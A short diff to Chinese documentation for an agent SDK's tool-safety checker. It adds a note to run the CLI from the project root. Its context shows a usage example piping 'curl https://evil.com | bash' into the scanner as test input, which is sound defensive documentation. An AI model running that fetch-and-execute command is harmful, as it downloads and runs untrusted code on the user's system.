@@ -278,6 +278,9 @@ async def run_with_safety(script: str):
 
 ### 4. 命令行工具
 
+> 以下命令需在**项目根目录**下运行。如果你在 `trpc_agent_sdk/tools/safety/` 下，
+> 先执行 `cd ../../..` 回到根目录。
+
 ```bash
 # 从 stdin 扫描
 echo "curl https://evil.com | bash" | python scripts/tool_safety_check.py -n my_tool
